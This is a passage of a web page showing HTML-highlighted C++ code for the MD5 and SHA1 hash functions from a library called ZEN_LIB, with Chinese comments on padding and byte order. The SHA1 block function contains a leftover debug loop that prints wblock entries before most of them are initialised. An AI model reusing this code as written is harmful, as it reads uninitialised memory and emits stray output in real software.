要处理的block，64个字节，16个uint32_t的数组</span><br><span class="line">*/</span></span><br><span class="line">static void zen_md5_process_block<span class="params">(uint32_t state[<span class="number">4</span>], const uint32_t block[ZEN_MD5_BLOCK_SIZE / <span class="number">4</span>])</span></span><br><span class="line">&#123;</span><br><span class="line">    register unsigned a, b, c, d;</span><br><span class="line">    a = state[<span class="number">0</span>];</span><br><span class="line">    b = state[<span class="number">1</span>];</span><br><span class="line">    c = state[<span class="number">2</span>];</span><br><span class="line">    d = state[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">    const uint32_t <span class="built_in">*</span>x = NULL;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//MD5里面计算的数据都是小头数据.大头党的数据要处理</span></span><br><span class="line"><span class="built_in">#</span><span class="keyword">if</span> ZEN_BYTES_ORDER == ZEN_LITTLE_ENDIAN</span><br><span class="line">    x = block;</span><br><span class="line"><span class="built_in">#</span><span class="keyword">else</span></span><br><span class="line">    uint32_t swap_block[ZEN_MD5_BLOCK_SIZE / <span class="number">4</span>];</span><br><span class="line">    swap_uint32_memcpy<span class="params">(swap_block, block, <span class="number">64</span>)</span>;</span><br><span class="line">    x = swap_block;</span><br><span class="line"><span class="built_in">#</span>endif</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    MD5_ROUND1<span class="params">(a, b, c, d, x[ <span class="number">0</span>],  <span class="number">7</span>, <span class="number">0</span>xd76aa478)</span>;</span><br><span class="line">    MD5_ROUND1<span class="params">(d, a, b, c, x[ <span class="number">1</span>], <span class="number">12</span>, <span class="number">0</span>xe8c7b756)</span>;</span><br><span class="line">    MD5_ROUND1<span class="params">(c, d, a, b, x[ <span class="number">2</span>], <span class="number">17</span>, <span class="number">0</span>x242070db)</span>;</span><br><span class="line">    MD5_ROUND1<span class="params">(b, c, d, a, x[ <span class="number">3</span>], <span class="number">22</span>, <span class="number">0</span>xc1bdceee)</span>;</span><br><span class="line">    MD5_ROUND1<span class="params">(a, b, c, d, x[ <span class="number">4</span>],  <span class="number">7</span>, <span class="number">0</span>xf57c0faf)</span>;</span><br><span class="line">    MD5_ROUND1<span class="params">(d, a, b, c, x[ <span class="number">5</span>], <span class="number">12</span>, <span class="number">0</span>x4787c62a)</span>;</span><br><span class="line">    MD5_ROUND1<span class="params">(c, d, a, b, x[ <span class="number">6</span>], <span class="number">17</span>, <span class="number">0</span>xa8304613)</span>;</span><br><span class="line">    MD5_ROUND1<span class="params">(b, c, d, a, x[ <span class="number">7</span>], <span class="number">22</span>, <span class="number">0</span>xfd469501)</span>;</span><br><span class="line">    MD5_ROUND1<span class="params">(a, b, c, d, x[ <span class="number">8</span>],  <span class="number">7</span>, <span class="number">0</span>x698098d8)</span>;</span><br><span class="line">    MD5_ROUND1<span class="params">(d, a, b, c, x[ <span class="number">9</span>], <span class="number">12</span>, <span class="number">0</span>x8b44f7af)</span>;</span><br><span class="line">    MD5_ROUND1<span class="params">(c, d, a, b, x[<span class="number">10</span>], <span class="number">17</span>, <span class="number">0</span>xffff5bb1)</span>;</span><br><span class="line">    MD5_ROUND1<span class="params">(b, c, d, a, x[<span class="number">11</span>], <span class="number">22</span>, <span class="number">0</span>x895cd7be)</span>;</span><br><span class="line">    MD5_ROUND1<span class="params">(a, b, c, d, x[<span class="number">12</span>],  <span class="number">7</span>, <span class="number">0</span>x6b901122)</span>;</span><br><span class="line">    MD5_ROUND1<span class="params">(d, a, b, c, x[<span class="number">13</span>], <span class="number">12</span>, <span class="number">0</span>xfd987193)</span>;</span><br><span class="line">    MD5_ROUND1<span class="params">(c, d, a, b, x[<span class="number">14</span>], <span class="number">17</span>, <span class="number">0</span>xa679438e)</span>;</span><br><span class="line">    MD5_ROUND1<span class="params">(b, c, d, a, x[<span class="number">15</span>], <span class="number">22</span>, <span class="number">0</span>x49b40821)</span>;</span><br><span class="line"></span><br><span class="line">    MD5_ROUND2<span class="params">(a, b, c, d, x[ <span class="number">1</span>],  <span class="number">5</span>, <span class="number">0</span>xf61e2562)</span>;</span><br><span class="line">    MD5_ROUND2<span class="params">(d, a, b, c, x[ <span class="number">6</span>],  <span class="number">9</span>, <span class="number">0</span>xc040b340)</span>;</span><br><span class="line">    MD5_ROUND2<span class="params">(c, d, a, b, x[<span class="number">11</span>], <span class="number">14</span>, <span class="number">0</span>x265e5a51)</span>;</span><br><span class="line">    MD5_ROUND2<span class="params">(b, c, d, a, x[ <span class="number">0</span>], <span class="number">20</span>, <span class="number">0</span>xe9b6c7aa)</span>;</span><br><span class="line">    MD5_ROUND2<span class="params">(a, b, c, d, x[ <span class="number">5</span>],  <span class="number">5</span>, <span class="number">0</span>xd62f105d)</span>;</span><br><span class="line">    MD5_ROUND2<span class="params">(d, a, b, c, x[<span class="number">10</span>],  <span class="number">9</span>,  <span class="number">0</span>x2441453)</span>;</span><br><span class="line">    MD5_ROUND2<span class="params">(c, d, a, b, x[<span class="number">15</span>], <span class="number">14</span>, <span class="number">0</span>xd8a1e681)</span>;</span><br><span class="line">    MD5_ROUND2<span class="params">(b, c, d, a, x[ <span class="number">4</span>], <span class="number">20</span>, <span class="number">0</span>xe7d3fbc8)</span>;</span><br><span class="line">    MD5_ROUND2<span class="params">(a, b, c, d, x[ <span class="number">9</span>],  <span class="number">5</span>, <span class="number">0</span>x21e1cde6)</span>;</span><br><span class="line">    MD5_ROUND2<span class="params">(d, a, b, c, x[<span class="number">14</span>],  <span class="number">9</span>, <span class="number">0</span>xc33707d6)</span>;</span><br><span class="line">    MD5_ROUND2<span class="params">(c, d, a, b, x[ <span class="number">3</span>], <span class="number">14</span>, <span class="number">0</span>xf4d50d87)</span>;</span><br><span class="line">    MD5_ROUND2<span class="params">(b, c, d, a, x[ <span class="number">8</span>], <span class="number">20</span>, <span class="number">0</span>x455a14ed)</span>;</span><br><span class="line">    MD5_ROUND2<span class="params">(a, b, c, d, x[<span class="number">13</span>],  <span class="number">5</span>, <span class="number">0</span>xa9e3e905)</span>;</span><br><span class="line">    MD5_ROUND2<span class="params">(d, a, b, c, x[ <span class="number">2</span>],  <span class="number">9</span>, <span class="number">0</span>xfcefa3f8)</span>;</span><br><span class="line">    MD5_ROUND2<span class="params">(c, d, a, b, x[ <span class="number">7</span>], <span class="number">14</span>, <span class="number">0</span>x676f02d9)</span>;</span><br><span class="line">    MD5_ROUND2<span class="params">(b, c, d, a, x[<span class="number">12</span>], <span class="number">20</span>, <span class="number">0</span>x8d2a4c8a)</span>;</span><br><span class="line"></span><br><span class="line">    MD5_ROUND3<span class="params">(a, b, c, d, x[ <span class="number">5</span>],  <span class="number">4</span>, <span class="number">0</span>xfffa3942)</span>;</span><br><span class="line">    MD5_ROUND3<span class="params">(d, a, b, c, x[ <span class="number">8</span>], <span class="number">11</span>, <span class="number">0</span>x8771f681)</span>;</span><br><span class="line">    MD5_ROUND3<span class="params">(c, d, a, b, x[<span class="number">11</span>], <span class="number">16</span>, <span class="number">0</span>x6d9d6122)</span>;</span><br><span class="line">    MD5_ROUND3<span class="params">(b, c, d, a, x[<span class="number">14</span>], <span class="number">23</span>, <span class="number">0</span>xfde5380c)</span>;</span><br><span class="line">    MD5_ROUND3<span class="params">(a, b, c, d, x[ <span class="number">1</span>],  <span class="number">4</span>, <span class="number">0</span>xa4beea44)</span>;</span><br><span class="line">    MD5_ROUND3<span class="params">(d, a, b, c, x[ <span class="number">4</span>], <span class="number">11</span>, <span class="number">0</span>x4bdecfa9)</span>;</span><br><span class="line">    MD5_ROUND3<span class="params">(c, d, a, b, x[ <span class="number">7</span>], <span class="number">16</span>, <span class="number">0</span>xf6bb4b60)</span>;</span><br><span class="line">    MD5_ROUND3<span class="params">(b, c, d, a, x[<span class="number">10</span>], <span class="number">23</span>, <span class="number">0</span>xbebfbc70)</span>;</span><br><span class="line">    MD5_ROUND3<span class="params">(a, b, c, d, x[<span class="number">13</span>],  <span class="number">4</span>, <span class="number">0</span>x289b7ec6)</span>;</span><br><span class="line">    MD5_ROUND3<span class="params">(d, a, b, c, x[ <span class="number">0</span>], <span class="number">11</span>, <span class="number">0</span>xeaa127fa)</span>;</span><br><span class="line">    MD5_ROUND3<span class="params">(c, d, a, b, x[ <span class="number">3</span>], <span class="number">16</span>, <span class="number">0</span>xd4ef3085)</span>;</span><br><span class="line">    MD5_ROUND3<span class="params">(b, c, d, a, x[ <span class="number">6</span>], <span class="number">23</span>,  <span class="number">0</span>x4881d05)</span>;</span><br><span class="line">    MD5_ROUND3<span class="params">(a, b, c, d, x[ <span class="number">9</span>],  <span class="number">4</span>, <span class="number">0</span>xd9d4d039)</span>;</span><br><span class="line">    MD5_ROUND3<span class="params">(d, a, b, c, x[<span class="number">12</span>], <span class="number">11</span>, <span class="number">0</span>xe6db99e5)</span>;</span><br><span class="line">    MD5_ROUND3<span class="params">(c, d, a, b, x[<span class="number">15</span>], <span class="number">16</span>, <span class="number">0</span>x1fa27cf8)</span>;</span><br><span class="line">    MD5_ROUND3<span class="params">(b, c, d, a, x[ <span class="number">2</span>], <span class="number">23</span>, <span class="number">0</span>xc4ac5665)</span>;</span><br><span class="line"></span><br><span class="line">    MD5_ROUND4<span class="params">(a, b, c, d, x[ <span class="number">0</span>],  <span class="number">6</span>, <span class="number">0</span>xf4292244)</span>;</span><br><span class="line">    MD5_ROUND4<span class="params">(d, a, b, c, x[ <span class="number">7</span>], <span class="number">10</span>, <span class="number">0</span>x432aff97)</span>;</span><br><span class="line">    MD5_ROUND4<span class="params">(c, d, a, b, x[<span class="number">14</span>], <span class="number">15</span>, <span class="number">0</span>xab9423a7)</span>;</span><br><span class="line">    MD5_ROUND4<span class="params">(b, c, d, a, x[ <span class="number">5</span>], <span class="number">21</span>, <span class="number">0</span>xfc93a039)</span>;</span><br><span class="line">    MD5_ROUND4<span class="params">(a, b, c, d, x[<span class="number">12</span>],  <span class="number">6</span>, <span class="number">0</span>x655b59c3)</span>;</span><br><span class="line">    MD5_ROUND4<span class="params">(d, a, b, c, x[ <span class="number">3</span>], <span class="number">10</span>, <span class="number">0</span>x8f0ccc92)</span>;</span><br><span class="line">    MD5_ROUND4<span class="params">(c, d, a, b, x[<span class="number">10</span>], <span class="number">15</span>, <span class="number">0</span>xffeff47d)</span>;</span><br><span class="line">    MD5_ROUND4<span class="params">(b, c, d, a, x[ <span class="number">1</span>], <span class="number">21</span>, <span class="number">0</span>x85845dd1)</span>;</span><br><span class="line">    MD5_ROUND4<span class="params">(a, b, c, d, x[ <span class="number">8</span>],  <span class="number">6</span>, <span class="number">0</span>x6fa87e4f)</span>;</span><br><span class="line">    MD5_ROUND4<span class="params">(d, a, b, c, x[<span class="number">15</span>], <span class="number">10</span>, <span class="number">0</span>xfe2ce6e0)</span>;</span><br><span class="line">    MD5_ROUND4<span class="params">(c, d, a, b, x[ <span class="number">6</span>], <span class="number">15</span>, <span class="number">0</span>xa3014314)</span>;</span><br><span class="line">    MD5_ROUND4<span class="params">(b, c, d, a, x[<span class="number">13</span>], <span class="number">21</span>, <span class="number">0</span>x4e0811a1)</span>;</span><br><span class="line">    MD5_ROUND4<span class="params">(a, b, c, d, x[ <span class="number">4</span>],  <span class="number">6</span>, <span class="number">0</span>xf7537e82)</span>;</span><br><span class="line">    MD5_ROUND4<span class="params">(d, a, b, c, x[<span class="number">11</span>], <span class="number">10</span>, <span class="number">0</span>xbd3af235)</span>;</span><br><span class="line">    MD5_ROUND4<span class="params">(c, d, a, b, x[ <span class="number">2</span>], <span class="number">15</span>, <span class="number">0</span>x2ad7d2bb)</span>;</span><br><span class="line">    MD5_ROUND4<span class="params">(b, c, d, a, x[ <span class="number">9</span>], <span class="number">21</span>, <span class="number">0</span>xeb86d391)</span>;</span><br><span class="line"></span><br><span class="line">    state[<span class="number">0</span>] += a;</span><br><span class="line">    state[<span class="number">1</span>] += b;</span><br><span class="line">    state[<span class="number">2</span>] += c;</span><br><span class="line">    state[<span class="number">3</span>] += d;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*!</span><br><span class="line">@brief      内部函数，处理数据的前面部分(&gt;64字节的部分)，每次组成一个64字节的block就进行杂凑处理</span><br><span class="line">@param[out] ctx  算法的context，用于记录一些处理的上下文和结果</span><br><span class="line">@param[in]  buf  处理的数据，</span><br><span class="line">@param[in]  size 处理的数据长度</span><br><span class="line">*/</span></span><br><span class="line">static void zen_md5_update<span class="params">(md5_ctx *ctx, const unsigned char *buf, size_t size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//为什么不是=，因为在某些环境下，可以多次调用zen_md5_update，但这种情况，必须保证前面的调用，每次都没有unprocessed_</span></span><br><span class="line">    ctx-&gt;length_ += size;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//每个处理的块都是64字节</span></span><br><span class="line">    while <span class="params">(size &gt;= ZEN_MD5_BLOCK_SIZE)</span></span><br><span class="line">    &#123;</span><br><span class="line">        zen_md5_process_block<span class="params">(ctx-&gt;hash_, reinterpret_cast&lt;const uint32_t *&gt;<span class="params">(buf)</span>)</span>;</span><br><span class="line">        buf  += ZEN_MD5_BLOCK_SIZE;</span><br><span class="line">        size -= ZEN_MD5_BLOCK_SIZE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ctx-&gt;unprocessed_ = size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*!</span><br><span class="line">@brief      内部函数，处理数据的末尾部分，我们要拼出最后1个（或者两个）要处理的BLOCK，加上0x80，加上长度进行处理</span><br><span class="line">@param[in]  ctx    算法的context，用于记录一些处理的上下文和结果</span><br><span class="line">@param[in]  buf    处理的数据</span><br><span class="line">@param[in]  size   处理buffer的长度</span><br><span class="line">@param[out] result 返回的结果，</span><br><span class="line">*/</span></span><br><span class="line">static void zen_md5_final<span class="params">(md5_ctx *ctx, const unsigned char *buf, size_t size, unsigned char *result)</span></span><br><span class="line">&#123;</span><br><span class="line">    uint32_t message[ZEN_MD5_BLOCK_SIZE / <span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">//保存剩余的数据，我们要拼出最后1个（或者两个）要处理的块，前面的算法保证了，最后一个块肯定小于64个字节</span></span><br><span class="line">    <span class="keyword">if</span> <span class="params">(ctx-&gt;unprocessed_)</span></span><br><span class="line">    &#123;</span><br><span class="line">        memcpy<span class="params">(message, buf + size - ctx-&gt;unprocessed_, static_cast&lt;size_t&gt;<span class="params">( ctx-&gt;unprocessed_)</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//得到0x80要添加在的位置（在uint32_t 数组中），</span></span><br><span class="line">    uint32_t index = <span class="params">(<span class="params">(uint32_t)</span>ctx-&gt;length_ &amp; <span class="number">63</span>)</span> &gt;&gt; <span class="number">2</span>;</span><br><span class="line">    uint32_t shift = <span class="params">(<span class="params">(uint32_t)</span>ctx-&gt;length_ &amp; <span class="number">3</span>)</span> <span class="built_in">*</span> <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//添加0x80进去，并且把余下的空间补充0</span></span><br><span class="line">    message[index]   &amp;= ~<span class="params">(<span class="number">0</span>xFFFFFFFF &lt;&lt; shift)</span>;</span><br><span class="line">    message[index++] ^= <span class="number">0</span>x80 &lt;&lt; shift;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//如果这个block还无法处理，其后面的长度无法容纳长度64bit，那么先处理这个block</span></span><br><span class="line">    <span class="keyword">if</span> <span class="params">(index &gt; <span class="number">14</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        while <span class="params">(index &lt; <span class="number">16</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            message[index++] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        zen_md5_process_block<span class="params">(ctx-&gt;hash_, message)</span>;</span><br><span class="line">        index = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//补0</span></span><br><span class="line">    while <span class="params">(index &lt; <span class="number">14</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        message[index++] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//保存长度，注意是bit位的长度,这个问题让我看着郁闷了半天，</span></span><br><span class="line">    uint64_t data_len = <span class="params">(ctx-&gt;length_)</span> &lt;&lt; <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//注意MD5算法要求的64bit的长度是小头LITTLE-ENDIAN编码，注意下面的比较是!=</span></span><br><span class="line"><span class="built_in">#</span><span class="keyword">if</span> ZEN_BYTES_ORDER <span class="built_in">!</span>= ZEN_LITTLE_ENDIAN</span><br><span class="line">    data_len = ZEN_SWAP_UINT64<span class="params">(data_len)</span>;</span><br><span class="line"><span class="built_in">#</span>endif</span><br><span class="line"></span><br><span class="line">    message[<span class="number">14</span>] = <span class="params">(uint32_t)</span> <span class="params">(data_len &amp; <span class="number">0</span>x00000000FFFFFFFF)</span>;</span><br><span class="line">    message[<span class="number">15</span>] = <span class="params">(uint32_t)</span> <span class="params">(<span class="params">(data_len &amp; <span class="number">0</span>xFFFFFFFF00000000ULL)</span> &gt;&gt; <span class="number">32</span>)</span>;</span><br><span class="line"></span><br><span class="line">    zen_md5_process_block<span class="params">(ctx-&gt;hash_, message)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//注意结果是小头党的，在大头的世界要进行转换</span></span><br><span class="line"><span class="built_in">#</span><span class="keyword">if</span> ZEN_BYTES_ORDER == ZEN_LITTLE_ENDIAN</span><br><span class="line">    memcpy<span class="params">(result, &amp;ctx-&gt;hash_, ZEN_MD5_HASH_SIZE)</span>;</span><br><span class="line"><span class="built_in">#</span><span class="keyword">else</span></span><br><span class="line">    swap_uint32_memcpy<span class="params">(result, &amp;ctx-&gt;hash_, ZEN_MD5_HASH_SIZE)</span>;</span><br><span class="line"><span class="built_in">#</span>endif</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//计算一个内存数据的MD5值</span></span><br><span class="line">unsigned char <span class="built_in">*</span>ZEN_LIB::md5<span class="params">(const unsigned char *buf,</span><br><span class="line">                            size_t size,</span><br><span class="line">                            unsigned char result[ZEN_MD5_HASH_SIZE])</span></span><br><span class="line">&#123;</span><br><span class="line">    assert<span class="params">(result != NULL)</span>;</span><br><span class="line"></span><br><span class="line">    md5_ctx ctx;</span><br><span class="line">    zen_md5_init<span class="params">(&amp;ctx)</span>;</span><br><span class="line">    zen_md5_update<span class="params">(&amp;ctx, buf, size)</span>;</span><br><span class="line">    zen_md5_final<span class="params">(&amp;ctx, buf, size, result)</span>;</span><br><span class="line">    return result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//================================================================================================</span></span><br><span class="line"><span class="comment">//SHA1的算法</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//每次处理的BLOCK的大小</span></span><br><span class="line">static const size_t ZEN_SHA1_BLOCK_SIZE = <span class="number">64</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//SHA1算法的上下文，保存一些状态，中间数据，结果</span></span><br><span class="line">typedef struct sha1_ctx</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//处理的数据的长度</span></span><br><span class="line">    uint64_t length_;</span><br><span class="line">    <span class="comment">//还没有处理的数据长度</span></span><br><span class="line">    uint64_t unprocessed_;</span><br><span class="line">    <span class="comment">/* 160-bit algorithm internal hashing state */</span></span><br><span class="line">    uint32_t hash_[<span class="number">5</span>];</span><br><span class="line">&#125; sha1_ctx;</span><br><span class="line"></span><br><span class="line"><span class="comment">//内部函数，SHA1算法的上下文的初始化</span></span><br><span class="line">static void zen_sha1_init<span class="params">(sha1_ctx *ctx)</span></span><br><span class="line">&#123;</span><br><span class="line">    ctx-&gt;length_ = <span class="number">0</span>;</span><br><span class="line">    ctx-&gt;unprocessed_ = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 初始化算法的几个常量，魔术数</span></span><br><span class="line">    ctx-&gt;hash_[<span class="number">0</span>] = <span class="number">0</span>x67452301;</span><br><span class="line">    ctx-&gt;hash_[<span class="number">1</span>] = <span class="number">0</span>xefcdab89;</span><br><span class="line">    ctx-&gt;hash_[<span class="number">2</span>] = <span class="number">0</span>x98badcfe;</span><br><span class="line">    ctx-&gt;hash_[<span class="number">3</span>] = <span class="number">0</span>x10325476;</span><br><span class="line">    ctx-&gt;hash_[<span class="number">4</span>] = <span class="number">0</span>xc3d2e1f0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*!</span><br><span class="line">@brief      内部函数，对一个64bit内存块进行摘要(杂凑)处理，</span><br><span class="line">@param      hash  存放计算hash结果的的数组</span><br><span class="line">@param      block 要计算的处理得内存块</span><br><span class="line">*/</span></span><br><span class="line">static void zen_sha1_process_block<span class="params">(uint32_t hash[<span class="number">5</span>],</span><br><span class="line">                                   const uint32_t block[ZEN_SHA1_BLOCK_SIZE / <span class="number">4</span>])</span></span><br><span class="line">&#123;</span><br><span class="line">    size_t        t;</span><br><span class="line">    uint32_t      wblock[<span class="number">80</span>];</span><br><span class="line">    register uint32_t      a, b, c, d, e, temp;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//SHA1算法处理的内部数据要求是大头党的，在小头的环境转换</span></span><br><span class="line"><span class="built_in">#</span><span class="keyword">if</span> ZEN_BYTES_ORDER == ZEN_LITTLE_ENDIAN</span><br><span class="line">    swap_uint32_memcpy<span class="params">(wblock, block, ZEN_SHA1_BLOCK_SIZE)</span>;</span><br><span class="line"><span class="built_in">#</span><span class="keyword">else</span></span><br><span class="line">    ::memcpy<span class="params">(wblock, block, ZEN_SHA1_BLOCK_SIZE)</span>;</span><br><span class="line"><span class="built_in">#</span>endif</span><br><span class="line">    <span class="keyword">for</span> <span class="params">(t = <span class="number">0</span>; t &lt; <span class="number">80</span>; t++)</span> &#123;</span><br><span class="line">        printf<span class="params">(<span class="string">"%u\n"</span>, wblock[t])</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//处理</span></span><br><span class="line">    <span class="keyword">for</span> <span class="params">(t = <span class="number">16</span>; t &lt; <span class="number">80</span>; t++)</span></span><br><span class="line">    &#123;</span><br><span class="line">        wblock[t] = ROTL32<span class="params">(wblock[t - <span class="number">3</span>] ^ wblock[t - <span class="number">8</span>] ^ wblock[t - <span class="number">14</span>] ^ wblock[t - <span class="number">16</span>], <span class="number">1</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    a = hash[<span class="number">0</span>];</span><br><span class="line">    b = hash[<span class="number">1</span>];</span><br><span class="line">    c = hash[<span class="number">2</span>];</span><br><span class="line">    d = hash[<span class="number">3</span>];</span><br><span class="line">    e = hash[<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> <span class="params">(t = <span class="number">0</span>; t &lt; <span class="number">20</span>; t++)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* the following is faster than ((B &amp; C) | ((~B) &amp; D)) */</span></span><br><span class="line">        temp =  ROTL32<span class="params">(a, <span class="number">5</span>)</span> + <span class="params">(<span class="params">(<span class="params">(c ^ d)</span> &amp; b)</span> ^ d)</span></span><br><span class="line">                + e + wblock[t] + <span class="number">0</span>x5A827999;</span><br><span class="line">        e = d;</span><br><span class="line">        d = c;</span><br><span class="line">        c = ROTL32<span class="params">(b, <span class="number">30</span>)</span>;</span><br><span class="line">        b = a;</span><br><span class="line">        a = temp;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// printf("%u\n", a);</span></span><br><span class="line"><span class="comment">// printf("%u\n", b);</span></span><br><span class="line"><span class="comment">// printf("%u\n", c);</span></span><br><span class="line"><span class="comment">// printf("%u\n", d);</span></span><br><span class="line"><span class="comment">// printf("%u\n", e);</span></span><br><span class="line">    <span class="keyword">for</span> <span class="params">(t = <span class="number">20</span>; t &lt; <span class="number">40</span>; t++)</span></span><br><span class="line">    &#123;</span><br><span class="line">        temp = ROTL32<span class="params">(a, <span class="number">5</span>)</span> + <span class="params">(b ^ c ^ d)</span> + e + wblock[t] + <span class="number">0</span>x6ED9EBA1;</span><br><span class="line">        e = d;</span><br><span class="line">        d = c;</span><br><span class="line">        c = ROTL32<span class="params">(b, <span class="number">30</span>)</span>;</span><br><span class="line">        b = a;</span><br><span class="line">        a = temp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> <span class="params">(t = <span class="number">40</span>; t &lt; <span class="number">60</span>; t++)</span></span><br><span class="line">    &#123;</span><br><span class="line">        temp = ROTL32<span class="params">(a, <span class="number">5</span>)</span> + <span class="params">(<span class="params">(b &amp; c)</span> | <span class="params">(b &amp; d)</span> | <span class="params">(c &amp; d)</span>)</span></span><br><span class="line">               + e + wblock[t] + <span class="number">0</span>x8F1BBCDC;</span><br><span class="line">        e = d;</span><br><span class="line">        d = c;</span><br><span class="line">        c = ROTL32<span class="params">(b, <span class="number">30</span>)</span>;</span><br><span class="line">        b = a;</span><br><span class="line">        a = temp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> <span class="params">(t = <span class="number">60</span>; t &lt; <span class="number">80</span>; t++)</span></span><br><span class="line">    &#123;</span><br><span class="line">        temp = ROTL32<span class="params">(a, <span class="number">5</span>)</span> + <span class="params">(b ^ c ^ d)</span> + e + wblock[t] + <span class="number">0</span>xCA62C1D6;</span><br><span class="line">        e = d;</span><br><span class="line">        d = c;</span><br><span class="line">        c = ROTL32<span class="params">(b, <span class="number">30</span>)</span>;</span><br><span class="line">        b = a;</span><br><span class="line">        a = temp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    hash[<span class="number">0</span>] += a;</span><br><span class="line">    hash[<span class="number">1</span>] += b;</span><br><span class="line">    hash[<span class="number">2</span>] += c;</span><br><span class="line">    hash[<span class="number">3</span>] += d;</span><br><span class="line">    hash[<span class="number">4</span>] += e;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*!</span><br><span class="line">@brief      内部函数，处理数据的前面部分(&gt;64字节的部分)，每次组成一个64字节的block就进行杂凑处理</span><br><span class="line">@param      ctx  算法的上下文，记录中间数据，结果等</span><br><span class="line">@param      msg  要进行计算的数据buffer</span><br><span class="line">@param      size 长度</span><br><span class="line">*/</span></span><br><span class="line">static void zen_sha1_update<span class="params">(sha1_ctx *ctx,</span><br><span class="line">                            const unsigned char *buf, </span><br><span class="line">                            size_t size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//为了让zen_sha1_update可以多次进入，长度可以累计</span></span><br><span class="line">    ctx-&gt;length_ += size;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//每个处理的块都是64字节</span></span><br><span class="line">    while <span class="params">(size &gt;= ZEN_SHA1_BLOCK_SIZE)</span></span><br><span class="line">    &#123;</span><br><span class="line">        zen_sha1_process_block<span class="params">(ctx-&gt;hash_, reinterpret_cast&lt;const uint32_t *&gt;<span class="params">(buf)</span>)</span>;</span><br><span class="line">        buf  += ZEN_SHA1_BLOCK_SIZE;</span><br><span class="line">        size -= ZEN_SHA1_BLOCK_SIZE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ctx-&gt;unprocessed_ = size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*!</span><br><span class="line">@brief      内部函数，处理数据的最后部分，添加0x80,补0，增加长度信息</span><br><span class="line">@param      ctx    算法的上下文，记录中间数据，结果等</span><br><span class="line">@param      msg    要进行计算的数据buffer</span><br><span class="line">@param      result 返回的结果</span><br><span class="line">*/</span></span><br><span class="line">static void zen_sha1_final<span class="params">(sha1_ctx *ctx, </span><br><span class="line">                           const unsigned char *msg,</span><br><span class="line">                           size_t size, </span><br><span class="line">                           unsigned char *result)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    uint32_t message[ZEN_SHA1_BLOCK_SIZE / <span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">//保存剩余的数据，我们要拼出最后1个（或者两个）要处理的块，前面的算法保证了，最后一个块肯定小于64个字节</span></span><br><span class="line">    <span class="keyword">if</span> <span class="params">(ctx-&gt;unprocessed_)</span></span><br><span class="line">    &#123;</span><br><span class="line">        memcpy<span class="params">(message, msg + size - ctx-&gt;unprocessed_, static_cast&lt;size_t&gt;<span class="params">( ctx-&gt;unprocessed_)</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//得到0x80要添加在的位置（在uint32_t 数组中），</span></span><br><span class="line">    uint32_t index = <span class="params">(<span class="params">(uint32_t)</span>ctx-&gt;length_ &amp; <span class="number">63</span>)</span> &gt;&gt; <span class="number">2</span>;</span><br><span class="line">    uint32_t shift = <span class="params">(<span class="params">(uint32_t)</span>ctx-&gt;length_ &amp; <span class="number">3</span>)</span> <span class="built_in">*</span> <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//添加0x80进去，并且把余下的空间补充0</span></span><br><span class="line">    message[index]   &amp;= ~<span class="params">(<span class="number">0</span>xFFFFFFFF &lt;&lt; shift)</span>;</span><br><span class="line">    message[index++] ^= <span class="number">0</span>x80 &lt;&lt; shift;</span><br><span class="line"></span><br><span class="line">    <span 